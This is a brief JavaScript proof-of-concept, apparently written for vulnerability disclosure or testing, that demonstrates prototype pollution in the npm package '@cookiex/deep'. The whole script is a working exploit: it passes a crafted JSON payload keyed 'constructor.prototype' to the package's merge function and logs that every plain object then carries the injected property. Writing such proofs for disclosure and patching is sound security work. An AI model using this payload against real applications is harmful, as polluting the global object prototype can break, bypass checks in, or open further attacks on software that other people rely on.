var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const deep = require('@cookiex/deep');
console.log({}.polluted);
const target = {};
deep.default(target, JSON.parse('{"constructor.prototype": {"polluted":"yes"}}'));
console.log({}.polluted);